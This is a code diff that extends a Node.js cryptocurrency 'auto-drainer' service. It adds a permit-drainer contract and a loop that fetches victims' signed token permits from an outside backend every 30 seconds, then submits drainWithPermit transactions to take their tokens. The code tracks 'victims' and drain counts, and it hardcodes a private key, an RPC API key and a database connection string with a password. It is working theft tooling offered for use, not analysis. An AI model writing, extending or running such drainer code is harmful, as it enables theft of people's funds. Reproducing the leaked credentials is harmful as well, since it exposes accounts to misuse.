@@ -10,15 +10,23 @@ const PORT = process.env.PORT || 3003;
 const CHAINS = [
   {
     chain: sepolia,
-    drainer: '0x20641E48446ae5c2B325ECcE3a2AB7a83d834CD3',
+    mainDrainer: '0x20641E48446ae5c2B325ECcE3a2AB7a83d834CD3',
+    permitDrainer: '0x913589D36b41eB60E6B9B574DcAEEc38abd1176b',
     rpc: 'https://eth-sepolia.g.alchemy.com/v2/H--HtDpZlgQ0zxKBt7zBC-DzXtxGRL0J'
   }
 ];
+
+const MONGODB_URI = process.env.MONGODB_URI || 'mongodb+srv://marvellouschibuike:Marvy247@cluster0.mongodb.net/drainkit?retryWrites=true&w=majority';
+const PERMIT_BACKEND = 'https://dkback.onrender.com';
 
 const PRIVATE_KEY = '0x8e4e0161ac8f367670394f767aabc24709cb1e3d4e9e6afe071b484859f1ac90';
 
 const DRAINER_ABI = parseAbi([
   'function drainToken(address token, address victim) external'
+]);
+
+const PERMIT_DRAINER_ABI = parseAbi([
+  'function drainWithPermit(address token, address owner, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external'
 ]);
 
 const ERC20_ABI = parseAbi([
@@ -31,16 +39,18 @@ const account = privateKeyToAccount(PRIVATE_KEY);
 // Track victims and their approved tokens
 const trackedVictims = new Map(); // { victimAddress: Set<tokenAddress> }
 const processedDrains = new Map(); // { drainId: timestamp }
+const processedPermits = new Set(); // { permitId }
 
 let stats = {
   totalDrained: 0,
   lastDrain: null,
   drainsByChain: {},
-  trackedVictims: 0
+  trackedVictims: 0,
+  permitsDrained: 0
 };
 
 async function monitorChain(config) {
-  const { chain, drainer, rpc } = config;
+  const { chain, mainDrainer, rpc } = config;
   
   const publicClient = createPublicClient({
     chain,
@@ -128,7 +138,7 @@ async function monitorChain(config) {
               try {
                 console.log(`🚀 Attempting drain...`);
                 const hash = await walletClient.writeContract({
-                  address: drainer,
+                  address: mainDrainer,
                   abi: DRAINER_ABI,
                   functionName: 'drainToken',
                   args: [token, victim],
@@ -172,16 +182,84 @@ async function monitorChain(config) {
   }
 }
 
+// Monitor permit signatures from backend
+async function monitorPermits() {
+  while (true) {
+    try {
+      const response = await fetch(`${PERMIT_BACKEND}/api/signatures`);
+      const signatures = await response.json();
+      
+      for (const sig of signatures) {
+        const permitId = `${sig.chainId}-${sig.token}-${sig.owner}`;
+        
+        if (processedPermits.has(permitId)) continue;
+        
+        console.log(`\n🔐 NEW PERMIT SIGNATURE DETECTED!`);
+        console.log(`Token: ${sig.token}`);
+        console.log(`Owner: ${sig.owner}`);
+        
+        const chainConfig = CHAINS.find(c => c.chain.id === sig.chainId);
+        if (!chainConfig) continue;
+        
+        try {
+          const walletClient = createWalletClient({
+            account,
+            chain: chainConfig.chain,
+            transport: http(chainConfig.rpc)
+          });
+          
+          console.log(`🚀 Executing permit drain...`);
+          
+          const hash = await walletClient.writeContract({
+            address: chainConfig.permitDrainer,
+            abi: PERMIT_DRAINER_ABI,
+            functionName: 'drainWithPermit',
+            args: [sig.token, sig.owner, BigInt(sig.value), BigInt(sig.deadline), sig.v, sig.r, sig.s],
+            gas: 300000n
+          });
+          
+          console.log(`📝 TX submitted: ${hash}`);
+          
+          const publicClient = createPublicClient({
+            chain: chainConfig.chain,
+            transport: http(chainConfig.rpc)
+          });
+          
+          const receipt = await publicClient.waitForTransactionReceipt({ hash });
+          
+          if (receipt.status === 'success') {
+            console.log(`✅ PERMIT DRAINED! TX: ${hash}`);
+            processedPermits.add(permitId);
+            stats.permitsDrained++;
+            stats.totalDrained++;
+            stats.lastDrain = new Date().toISOString();
+          }
+        } catch (error) {
+          console.error(`❌ Permit drain failed:`, error.message);
+        }
+      }
+    } catch (error) {
+      console.error(`❌ Permit monitoring error:`, error.message);
+    }
+    
+    await new Promise(resolve => setTimeout(resolve, 30000)); // Check every 30s
+  }
+}
+
 // Start monitoring all chains
 console.log('🤖 ENHANCED AUTO-DRAINER STARTED');
 console.log('✅ Monitors new approvals');
 console.log('✅ Tracks victim balances');
 console.log('✅ Auto-drains when tokens added');
+console.log('✅ Monitors permit signatures');
 console.log('Monitoring chains:', CHAINS.map(c => c.chain.name).join(', '));
 
 CHAINS.forEach(config => {
   monitorChain(config).catch(console.error);
 });
+
+// Start permit monitoring
+monitorPermits().catch(console.error);
 
 // Health check endpoint
 app.get('/', (req, res) => {
@@ -192,7 +270,8 @@ app.get('/', (req, res) => {
     lastDrain: stats.lastDrain,
     drainsByChain: stats.drainsByChain,
     trackedVictims: stats.trackedVictims,
-    activeVictims: trackedVictims.size
+    activeVictims: trackedVictims.size,
+    permitsDrained: stats.permitsDrained
   });
 });
 
